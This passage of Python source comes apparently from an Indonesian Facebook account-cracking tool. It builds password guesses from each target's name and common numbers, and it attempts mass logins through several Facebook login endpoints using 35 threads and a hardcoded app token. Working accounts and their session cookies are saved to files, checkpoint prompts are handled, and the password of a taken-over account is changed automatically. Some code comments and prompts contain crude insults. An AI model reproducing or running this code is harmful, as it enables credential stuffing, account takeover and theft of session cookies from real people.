            elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
                mem += (f"{war}Maaf Akun Ini A2F On")
            else:
                open('Hasil/Error.txt', 'a').write(f"{user}|{pasw}\n")
                mem +=(f"{war}Terjadi Masalah Terhadap Akun")
        else:
            open(f'Hasil/CP-'+durasi+'.txt', 'a').write(f"{user}|{pasw}\n")
            mem += ("%s[%s!%s] Terdapat %s Opsi \n"%(N,K,N,len(cek)))
        for opt in range(len(cek)):
            mem += (f"{jarak}{Q}[{C}{str(opt+1)}{Q}] "+cek[opt]+"\n")
    else:
        mem +=(f"{war}{M}Kata Sandi Telah DiUbah, Atau Salah Kata Sandi{Q}\n")
        open('Hasil/Gagal-Login.txt', 'a').write(f"{user}|{pasw}\n")
    print("\n"+war+user+"|"+pasw+"\n"+mem)
def ubah_pw_fast(session,response,link2,user,mmk):
    global mem
    dat,dat2={},{}
    but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
    for x in response("input"):
        if x.get("name") in but:
            dat.update({x.get("name"):x.get("value")})
    ubahPw=session.post(url_mb+link2.get("action"),data=dat).text
    resUbah=BeautifulSoup(ubahPw,"html.parser")
    link3=resUbah.find("form",{"method":"post"})
    but2=["submit[Next]","nh","fb_dtsg","jazoest"]
    if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
        for b in resUbah("input"):
            if b.get("name") in but2:
                dat2.update({b.get("name"):b.get("value")})
        dat2.update({"password_new":"".join(mmk)})
        an=session.post(url_mb+link3.get("action"),data=dat2)
        coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
        mem +=(f"\r{jarak}{N}[{I}✓{N}] Berhasil Mengubah Kata Sandi Menjadi :\n{jarak}{N}[{I}✓{N}]{I} {user}|{''.join(mmk)}|{coki}{N}")
        open('Hasil/Akun-Tap-Yes.txt', 'a').write(f"{user}|{''.join(mmk)}|{coki}\n")
        cek_apk_fast(session,coki)
        get_infoo_fast(session,coki)

def log_hasill(user, pasw, ttll):
    global ua
    lp = ""
#    ua = "Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
    host = "https://m.facebook.com"
    ses = requests.Session()
    ses.headers.update({
    "Host": "m.facebook.com",
    "cache-control": "max-age=0",
    "upgrade-insecure-requests": "1",
    "origin": host,
    "content-type": "application/x-www-form-urlencoded",
    "user-agent": ua,
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "x-requested-with": "mark.via.gp",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    "referer": host+"/login/?next&ref=dbl&fl&refid=8",
    "accept-encoding": "gzip, deflate",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    })
    data = {}
    ged = par(ses.get(host+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
    fm = ged.find("form",{"method":"post"})
    list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
    for i in fm.find_all("input"):
        if i.get("name") in list:
            data.update({i.get("name"):i.get("value")})
        else:
            continue
    data.update({"email":user,"pass":pasw})
    try:
        run = par(ses.post(host+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
    except requests.exceptions.TooManyRedirects:
        lp += (M+"Akun Ini KeSpam !!"+Q+"\n")
    if "c_user" in ses.cookies:
        lp += (I+"Akun Ini Tidak Check Poits\n")
    elif "checkpoint" in ses.cookies:
        form = run.find("form")
        dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
        jzst = form.find("input",{"name":"jazoest"})["value"]
        nh   = form.find("input",{"name":"nh"})["value"]
        dataD = {
            "fb_dtsg": dtsg,
            "fb_dtsg": dtsg,
            "jazoest": jzst,
            "jazoest": jzst,
            "checkpoint_data":"",
            "submit[Continue]":"Lanjutkan",
            "nh": nh
        }
        xnxx = par(ses.post(host+form["action"], data=dataD).text, "html.parser")
        ngew = [yy.text for yy in xnxx.find_all("option")]
        if(str(len(ngew))=="0"):
            lp += (I+"Akun Ini Hooo Yess (Tap Yes)"+Q+"\n")
            open("Hasil/Akun_Tap_Yes.txt","a+").write("{}|{}\n".format(user,pasw))
            bokep_japan_yang_terbaru("TAP", user, pasw, "-")
        else:
            lp += ("Tersedia %s Opsi \n"%(str(len(ngew))))
        for opt in range(len(ngew)):
            lp += ("      "+str(opt+1)+". "+ngew[opt]+"\n")
    elif "login_error" in str(run):
        oh = run.find("div",{"id":"login_error"}).find("div").text
        lp += ("%s%s%s\n"%(U,oh,Q))
    else:
        lp += (M+"Kata Sandi Sudah DiUbah !"+Q+"\n")
    print("\r"+war+K+user+"|"+pasw+" | "+ttll+Q+"\n"+war+lp+"            ",end=" >>KIKY")



def koki_apk(kukis_mama):
#	kiko = []
	try:
		kikis = kukis_mama.split(";")
		c_user = kikis[0]
		all_kus = kukis_mama.split(c_user+";")[1]
		coki_coki = (all_kus+";"+c_user)
		kiko = (coki_coki)
		return kiko
	except:
		return kukis_mama
#	print(kiko)

def dump_name(kukis):
	ses_ = requests.Session()
	url = "https://m.facebook.com/search/people/?q=Risky"
	dat_game = ses_.get(url,cookies={'cookie':kukis})
	datagame = par(dat_game.content,'html.parser')
	form_    = datagame.find('form',method='post')
	data_tex = datagame.text
	print(data_tex)
	open("tes.py","w").write(data_tex)

def cek_apk_v1(kukis):
    apk = []
    ak = 0
    ek = 0
    ses_ = requests.Session()
#    print(kukis)
    url = "https://m.facebook.com/settings/apps/tabbed/?tab=active"
    dat_game = ses_.get(url,cookies={'cookie':kukis})
    datagame = par(dat_game.content,'html.parser')
    form_    = datagame.find('form',method='post')
    data_tex = datagame.text
#    print(data_tex)
    if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau" in data_tex:
        apk.append(f"\n{jarak}{war}{M}Tidak Ada Aplikasi Yang Terkait {Q}({U}APK AKTIF{Q}){Q}")
    else:
        apk.append(f"\n{jarak}{war}{I}Aplikasi Yang Terkait {Q}({U}APK AKTIF{Q}){Q}")
        for asu in form_.find_all("h3"):
            try:
                celeng = asu.find('span').text
                celengg = asu.find('div').text
                ditambah = celengg.replace(celeng+"Ditambahkan"," DiTambahkan")
                ak += 1
                apk.append(f'\n{jarak}{jarak}[{ak}] {I}{celeng}{U}{ditambah}{Q}')
            except:
                try:
                    celeng = asu.find('span').text
                    ak += 1
                    apk.append(f'\n{jarak}{jarak}[{ak}] {I}{celeng}{Q}')
                except:pass

    url2 = "https://m.facebook.com/settings/apps/tabbed/?tab=inactive"
    dat_game = ses_.get(url2,cookies={'cookie':kukis})
    datagame = par(dat_game.content,'html.parser')
    form_    = datagame.find('form',method='post')
    data_texx = datagame.text
#    print(data_texx)
    if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in data_texx:
        apk.append(f"\n")
        apk.append(f"\n{jarak}{war}{M}Tidak Ada Aplikasi Yang Terkait{Q} ({K}APK Kedaluwarsa{Q}){Q}")
    else:
        apk.append(f"\n")
        apk.append(f"\n{jarak}{war}{I}Aplikasi Yang Terkait {Q}({K}APK Kedaluwarsa{Q}){Q}")
        for asu in form_.find_all("h3"):
            try:
                celeng = asu.find('span').text
                celengg = asu.find('div').text
                ditambah = celengg.replace(celeng+"Kedaluwarsa"," Kedaluwarsa")
                ek += 1
                apk.append(f'\n{jarak}{jarak}[{ek}] {K}{celeng}{C}{ditambah}{Q}')
            except:
                try:
                    celeng = asu.find('span').text
                    ak += 1
                    apk.append(f'\n{jarak}{jarak}[{ak}] {I}{celeng}{Q}')
                except:pass
    print(''.join(apk))
def visitor():
	try:
		datax = open(".datame", "r").read()
		datax = datax.split("User=")[1]
		try:
			ses_ = requests.Session()
			bhb = ""
			jhg = 1

			utl = "https://komarev.com/ghpvc/?username=jmbf&color=yellow"
			data_te = ses_.get(utl)
			gbl = par(data_te.content,'html.parser')
			for n in gbl.find_all("text"):
				bhb += (str(n))
			lee = bhb.split('y="14">')
			le = len(lee)
			le -= 1
			le = (lee[le].replace("</text>",""))
		except:
			le = ("NONE")
		jalan("[++] Selamat Datang User Jmbf Yang Ke "+I+str(datax)+Q+" Dari "+I+str(le)+Q+" User Jmbf");time.sleep(2)
	except:
		try:
			url_vis = "https://github.com/Dumai-991/jmbf/blob/Xnxx/README.md"
			url_visi = "https://camo.githubusercontent.com/6123034813c11ae497e730dcba77572e83eb96016e5528c8a6f789b27891b99c/68747470733a2f2f6b6f6d617265762e636f6d2f67687076632f3f757365726e616d653d6a6d626626636f6c6f723d79656c6c6f77"
			ses_ = requests.Session()
			bhb = ""
			jhg = 1


			data_te = ses_.get(url_vis).text.strip()
			data_te = ses_.get(url_visi)
			gbl = par(data_te.content,'html.parser')
			for n in gbl.find_all("text"):
				bhb += (str(n))
			lee = bhb.split('y="14">')
			le = len(lee)
			le -= 1
			le = (lee[le].replace("</text>",""))
#			try:
#				thp = bhb.split('<text x="92.5" y="14">')[1]
#			except:
#				thp = bhb.split('<text x="96" y="14">')[1]
#			thp2 = thp.split("</text>")
#			hasil_ = (thp2[0])
			hasil_ = (str(le))
			jalan("[++] Selamat Datang User Yang Ke >>"+I+hasil_+Q+"<< Semoga Hari Anda Menyenangkan");time.sleep(2)
			kiki = open(".datame", "w")
			kiki.write("User="+hasil_)
			kiki.close()
		except:pass


def gabung_pw():
	pq = ""
	bq = ""
	vv = 0
	cc = 0
	jalan("\n"+war+"Gunakan Tanda Koma Sebagai Pemisah")
#	jalan(war+"Gunakan Text Ini Jika Mau DiGunakan Contoh")
#	jalan(war+"Nama Depan Huruf "+U+"Kecil"+Q+" Ketik : depan")
#	jalan(war+"Nama Depan Huruf "+K+"Besar"+Q+" Ketik : DEPAN")
#	jalan(war+"Contoh : sayang,123456,bismilah,DEPAN123")
	jalan(war+"Contoh Password Yang Admin Seringan DiGunakan :)")
	jalan(war+'Password '+I+'Indonesia'+Q+' : sayang,kontol,anjing,bismillah,sayangku')
	jalan(war+'Password '+I+'Indonesia OLD'+Q+' : sayang,indonesia,bajingan,123456')
	paw = input(war+"Password : ").split(",")
	pakQ = open(".paww", "w")
	for n in paw:
		if len(n) <= 5:
			pq += (" "+n)
			vv += 1
		else:
			bq += (" "+n)
			cc += 1
			pakQ.write(n+"|")
	pakQ.close()
	if pq == "":
		pass
	else:
		jalan(war+"Terdapat "+M+str(vv)+Q+" Kata Sandi Yang Tidak Bisa DiGunakan !")
	if bq == "":
		pass
	else:
		jalan(war+"Terdapat "+I+str(cc)+Q+" Kata Sandi Dapat DiGunakan !\n")
def cek_konek():
	try:
#		cek_jaringan = requests.post("https://github.com/Dumai-991/Dumai-991")
		cek_jaringan = requests.get("https://www.google.com/search?q=jmbf&oq=jmbf&aqs=chrome..69i57j69i60j0i512l3j0i30l3.1092j0j1&sourceid=chrome-mobile&ie=UTF-8")
		pass
	except requests.exceptions.ConnectionError:
		sys.stdout.write(f'\r{war}Jaringan Anda Terputus !!'),
		sys.stdout.flush()
		cek_konek()
try:
	pln_tkn = open(".login.txt", "r").read()
except IOError:pass
	#os.system("rm -rf .login.txt")
#	exit(war+"Token Failed !!");time.sleep(2)

#### BUAT SANDI :V
def buat_sandi():
	jalan(war+"Silahkan Pilih Kata Sandi, Yang Menurut Anda Bagus !")


def buat_angka():
	kontol_hakiki = open(".paska", "w") # KONTOL HAKIKI
	print()
	jalan(war+M+"Masukan Angka Untuk Password, Dan Gunakan Koma Sebagai Pemisah"+Q)
	jalan(war+"Contoh : "+C+"123,1234,12345"+Q)
	paska = input(war+"Angka : ")
	if paska == "" or paska == " ":
		jalan(war+"Jangan Kosong Anak Kontol")
		buat_angka()
	else:
		try:
			paska = paska.split(",")
			for n in paska:
				try:
					open(".paska", "a").write(str(int(n))+"|")
				except:pass
		except:
			try:
				open(".paska", "a").write(str(int(paska))+"|")
			except:pass

	hakiki_kntl = open(".paska", "r").read()
	if hakiki_kntl in ("", " ", "  ", "   "):
		jalan(war+"Masukan Angka, Bukan Huruf :(")
		buat_angka()



def generateold(idt):
	results=[]
	try:
		jok = requests.get("https://m.facebook.com/"+idt+"?access_token="+pln_tkn)
		op = json.loads(jok.text)
		text = op['name']
		for i in text.split(" "):
			i=i.lower()
			if len(i)>=6 :
				results.append(i)
				results.append(i+"123")
				results.append(i+"1234")
				results.append(i+"12345")
			else:
				results.append(i)
				results.append(i+"123")
				results.append(i+"1234")
				results.append(i+"12345")
				results.append("123456")
				results.append("123456789")
				results.append("786786")
	except:
		results.append("123456")
		results.append("123456789")
		results.append("786786")
	return results
#def generate(text):
def generatev6(text):
	results=[]
	kiky_gg_gtg = text
	qz = text.split(" ")
	try:
		sj = open(".pass", "r").read()
	except:
		sj = ("KOSONG")
	try:
		paw = open(".paww", "r").read().split("|")
		for n in paw:
			if len(n)>= 5:
				try:
					baH = n.split("DEPAN")[1]
					kaw = "0"
				except:
					try:
						baH = n.split("depan")[1]
						kaw = "1"
					except:
						try:
							baH = n.split("lengkap")[1]
							kow = "2"
						except:
							kaw = "0"
							baH = ""
				if baH == "":
					results.append(n)
				if kow == "2":
					results.append(text)
				if kaw == "1":
					results.append(qz[0].lower()+baH)
				else:
					results.append(qz[0]+baH)
	except Exception as e:pass
	text = text.lower()
	kika = text.split(" ")
	results.append(kika[0])
	results.append(kika[0]+"123")
	results.append(kika[0]+"1234")
	results.append(kika[0]+"12345")
#	results.append(kika[0]+"123456")
	results.append(text)
	return results
"""	for i in text.split(" "):
		i=i.lower()
		if len(i)>=6 :
			results.append(i)
			results.append(i+"123")
			results.append(i+"1234")
			results.append(i+"12345")

		elif len(i)==3 or len(i)==4 or len(i)==5 :
			results.append(i+"123")
			results.append(i+"1234")
			results.append(i+"12345")

		else:
			results.append(i)
			results.append(i+"123")
			results.append(i+"1234")
			results.append(i+"12345")
			results.append(text)
	return results
"""
#def generatekotol(n__a):
def generate(n__a):
	bocil_alok_bersatu_melawan_pubg = []
	n__a = n__a.lower()
	text = n__a
	text = text.lower()
	try:dmi__gtg = open(".paska", "r").read()
	except:dmi__gtg = "123|1234|12345"
	dmi__gtg = dmi__gtg.split("|")

#	for i in n__a.split(" "): # <===== NAMA LENGKAP + ANGKA MANUAL
#		i=i.lower()
#		for nolep in dmi__gtg:
#			bocil_alok_bersatu_melawan_pubg.append(i+nolep)


	nama_tt_ = n__a.split(" ")
	for nolep in dmi__gtg:  # <===== NAMA DEPAN AJA + ANGKA MANUAL
		bocil_alok_bersatu_melawan_pubg.append(nama_tt_[0]+nolep)
	bocil_alok_bersatu_melawan_pubg.append(text)
	try:sj = open(".pass", "r").read()     # <====== PASS GABUNGAN
	except:sj = ("KOSONG")
	try:
		paw = open(".paww", "r").read().split("|")
		for n in paw:
			if len(n)>= 5:
				bocil_alok_bersatu_melawan_pubg.append(n)
	except:pass




	return bocil_alok_bersatu_melawan_pubg




####### VERSION SIMPEL
"""
		if len(i)>=6 :
			bocil_alok_bersatu_melawan_pubg.append(i+"123")
			bocil_alok_bersatu_melawan_pubg.append(i+"1234")
			bocil_alok_bersatu_melawan_pubg.append(i+"12345")
		elif len(i)==3 or len(i)==4 or len(i)==5 :
			bocil_alok_bersatu_melawan_pubg.append(i)
			bocil_alok_bersatu_melawan_pubg.append(i+"123")
			bocil_alok_bersatu_melawan_pubg.append(i+"1234")
			bocil_alok_bersatu_melawan_pubg.append(i+"12345")
		else:
			bocil_alok_bersatu_melawan_pubg.append(i)
			bocil_alok_bersatu_melawan_pubg.append(i+"123")
			bocil_alok_bersatu_melawan_pubg.append(i+"1234")
			bocil_alok_bersatu_melawan_pubg.append(i+"12345")

	bocil_alok_bersatu_melawan_pubg.append()
"""




def generatev4(text):
	results=[]
	kiky_gg_gtg = text
	qz = text.split(" ")
	try:
		sj = open(".pass", "r").read()
	except:
		sj = ("KOSONG")
	try:
		paw = open(".paww", "r").read().split("|")
		for n in paw:
			if len(n)>= 5:
				try:
					baH = n.split("DEPAN")[1]
					kaw = "0"
				except:
					try:
						baH = n.split("depan")[1]
						kaw = "1"
					except:
						try:
							baH = n.split("lengkap")[1]
							kow = "2"
						except:
							kaw = "0"
							baH = ""
				if baH == "":
					results.append(n)
				if kow == "2":
					results.append(text)
				if kaw == "1":
					results.append(qz[0].lower()+baH)
				else:
					results.append(qz[0]+baH)
	except Exception as e:pass
	text = text.lower()
	for i in text.split(" "):
		i=i.lower()
		if len(i)>=6 :
			results.append(i)
			results.append(i+"123")
			results.append(i+"1234")
			results.append(i+"12345")

		elif len(i)==3 or len(i)==4 or len(i)==5 :
			results.append(i+"123")
			results.append(i+"1234")
			results.append(i+"12345")

		else:
			results.append(i)
			results.append(i+"123")
			results.append(i+"1234")
			results.append(i+"12345")
			results.append(i+"123456")
			results.append(text)
	return results
def log_api_1(em,pas):
#    ua = _dapunta_dapunta_('ugent.txt','r').read()
    global ua
    r = requests.Session()
    header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),"x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)),"x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA","user-agent": ua,"content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
    response = r.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + em + '&password=' + pas + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header)
    if 'session_key' in response.text and 'EAAA' in response.text:return {"status":"ok","email":em,"pass":pas}
    elif 'www.facebook.com' in response.json()['error_msg']:return {"status":"cp","email":em,"pass":pas}
    else:return {"status":"error","email":em,"pass":pas}
def log_api_2(em,pas):
 #   ua = _dapunta_dapunta_('ugent.txt','r').read()
    global ua
    r = requests.Session()
    header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),"x-fb-sim-hni": str(random.randint(10000, 40000)),"x-fb-net-hni": str(random.randint(10000, 40000)),"x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA","user-agent": ua,"content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
    param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'json', 'sdk_version': '2', 'email': em, 'locale': 'en_US', 'password': pas, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig':'3f555f99fb61fcd7aa0c44f58f522ef6'}
    api = 'https://b-api.facebook.com/method/auth.login'
    response = r.get(api, params=param, headers=header)
    if 'session_key' in response.text and 'EAAA' in response.text:return {"status":"ok","email":em,"pass":pas}
    elif 'www.facebook.com' in response.json()['error_msg']:return {"status":"cp","email":em,"pass":pas}
    else:return {"status":"error","email":em,"pass":pas}
def log_mbasic_1(em,pas):
#    ua = _dapunta_dapunta_('ugent.txt','r').read()
    global ua
    r = requests.Session()
    r.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get("https://m.facebook.com/")
    b = r.post("https://m.facebook.com/login.php", data={"email": em, "pass": pas, "login": "submit"})
    _raw_cookies_ = (";").join([ "%s=%s" % (key, value) for key, value in r.cookies.get_dict().items() ])
    if "c_user" in r.cookies.get_dict().keys():return {"status":"ok","email":em,"pass":pas,"cookies":_raw_cookies_}
    elif "checkpoint" in r.cookies.get_dict().keys():return {"status":"cp","email":em,"pass":pas,"cookies":_raw_cookies_}
    else:return {"status":"error","email":em,"pass":pas}
def log_mbasic_2(em,pas):
#    ua = _dapunta_dapunta_('ugent.txt','r').read()
    global ua
    r = requests.Session()
    r.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get("https://m.facebook.com/")
    b = bs4.BeautifulSoup(p.text,"html.parser")
    meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
    data={}
    for i in b("input"):
        if i.get("value") is None:
            if i.get("name")=="email":data.update({"email":em})
            elif i.get("name")=="pass":data.update({"pass":pas})
            else:data.update({i.get("name"):""})
        else:data.update({i.get("name"):i.get("value")})
    data.update({"fb_dtsg":meta,"m_sess":"","__user":"0","__req":"d","__csr":"","__a":"","__dyn":"","encpass":""})
    r.headers.update({"referer":"https://m.facebook.com/login/?next&ref=dbl&fl&refid=8"})
    po = r.post("https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
    _raw_cookies_ = (";").join([ "%s=%s" % (key, value) for key, value in r.cookies.get_dict().items() ])
    if "c_user" in list(r.cookies.get_dict().keys()):return {"status":"ok","email":em,"pass":pas,"cookies":_raw_cookies_}
    elif "checkpoint" in list(r.cookies.get_dict().keys()):return {"status":"cp","email":em,"pass":pas,"cookies":_raw_cookies_}
    else:return {"status":"error","email":em,"pass":pas}

def log_api(em,pas,hosts):
    ua = random.choice(['Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]']);r = requests.Session();r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"});p = r.get("https://mbasic.facebook.com/");b = bs4.BeautifulSoup(p.text,"html.parser");meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text));data={}
    r = requests.Session()
    header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
        "x-fb-sim-hni": str(random.randint(20000, 40000)),
        "x-fb-net-hni": str(random.randint(20000, 40000)),
        "x-fb-connection-quality": "EXCELLENT",
        "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
        "user-agent": ua,
        "content-type": "application/x-www-form-urlencoded",
        "x-fb-http-engine": "Liger"}
    param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
        'format': 'json',
        'sdk_version': '2',
        'email': em,
        'locale': 'en_US',
        'password': pas,
        'sdk': 'ios',
        'generate_session_cookies': '1',
        'sig':'3f555f99fb61fcd7aa0c44f58f522ef6'}
    api = 'https://b-api.facebook.com/method/auth.login'
    response = r.get(api, params=param, headers=header)
    if 'session_key' in response.text and 'EAAA' in response.text:
        return {"status":"success","email":em,"pass":pas}
    elif 'www.facebook.com' in response.json()['error_msg']:
        return {"status":"cp","email":em,"pass":pas}
    else:return {"status":"error","email":em,"pass":pas}
def logger(em,pas,hosts):
    ua = random.choice(['Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]']);r = requests.Session();r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"});p = r.get("https://mbasic.facebook.com/");b = bs4.BeautifulSoup(p.text,"html.parser");meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text));data={}
    for i in b("input"):
        if i.get("value") is None:
            if i.get("name")=="email":data.update({"email":em})
            elif i.get("name")=="pass":data.update({"pass":pas})
            else:data.update({i.get("name"):""})
        else:data.update({i.get("name"):i.get("value")})
    data.update({"fb_dtsg":meta,"m_sess":"","__user":"0","__req":"d","__csr":"","__a":"","__dyn":"","encpass":""});r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"});po = r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
    if "c_user" in list(r.cookies.get_dict().keys()):return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    elif "checkpoint" in list(r.cookies.get_dict().keys()):return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    else:return {"status":"error","email":em,"pass":pas}
def log_mbasic(em,pas,hosts):
    global ua
    r = requests.Session()
    r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get("https://mbasic.facebook.com/")
    b = bs4.BeautifulSoup(p.text,"html.parser")
    meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
    data={}
    for i in b("input"):
        if i.get("value") is None:
            if i.get("name")=="email":
                data.update({"email":em})
            elif i.get("name")=="pass":
                data.update({"pass":pas})
            else:
                data.update({i.get("name"):""})
        else:
            data.update({i.get("name"):i.get("value")})
    data.update(
        {"fb_dtsg":meta,"m_sess":"","__user":"0",
        "__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
        }
    )
    r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
    po = r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
    if "c_user" in list(r.cookies.get_dict().keys()):
        return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}

    elif "checkpoint" in list(r.cookies.get_dict().keys()):
        return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    else:return {"status":"error","email":em,"pass":pas}
class crackmenu:

    def __init__(self,isifile):
        self.id = []
    def crackold(self,isifile):
        try:
            self.apk = isifile
            self.id = open(self.apk).read().splitlines()
        except:
            print(war+'File Not Found! Try Again')
            time.sleep(2)
            menu()
        if "KIKY_GTG" == "KIKY_GTG":
            while True:
                jalan(war+"Contoh Password : sayang,123456,123456789")
                pwx = input('\n'+inp+"Masukan Password : ")
                jalan("%sPassword Yang DiGunakan : %s%s"%(war,I,pwx))
                if pwx == '':
                    jalan(war+"Isi Password Dengan Benar !!")
                elif len(pwx)<=5:
                    jalan(war+"Password Minimal 6 Huruf !!")
                else:
                    tanya_opsi()
                    self.pro_ses()
                    def mobile_n(zsc=None):
                        with zthreads(max_workers=35) as (form):
                             for uid in self.id:
                                 try:
                                     userid = uid.split('<=>')[0]
                                     form.submit(self.mobile_,userid,zsc )
                                 except: pass
                        os.remove(self.apk)
                        exit(war+"Done !!")

                    mobile_n(pwx.split(','))
                    break
    def pro_ses(self):
        jalan("\n")
        jalan(war+M+"Jika Ada Error Harap Report KeAdmin !")
        jalan(war+M+"Jika Tidak Hasil Hidup Matikan Mode Pesawat Selama 5 Detik")
        jalan(war+"Proses Crack Sedang Berjalan Harap Tunggu : "+Q+"["+C+datetime.now().strftime('%H:%M:%S')+Q+"]")
        print(war+"Hidup Matikan Mode Pesawat Jika Tidak Ada Hasil\n"+war+"Hasil Crack Yang CP DiSimpan Di : "+K+"Hasil/CP-"+durasi+".txt\n"+Q+war+"Hasil Crack Yang OK DiSimpan Di : "+I+"Hasil/OK-"+durasi+".txt\n\n"+Q)

    def menu_crack(self):   # METHOD AUTO PASSWROD
        jalan("\n"+war+M+"Silahkan Pilih Metode Login !")
        jalan(war+M+"Silahkan Coba Satu Satu, Jangan Lupa Hidup Matikan Mode Pesawat")
        print(Q+"[1] B-Api V1      ( Fast Crack  ) ( Rawan Spam )");time.sleep(0.02)
        print(Q+"[2] B-Api V2      ( Fast Crack  ) ");time.sleep(0.02)
        print(Q+"[3] B-Api V3      ( Fast Crack  )");time.sleep(0.02)
        print(Q+"[4] Mbasic V1     ( Slow Crack  )");time.sleep(0.02)
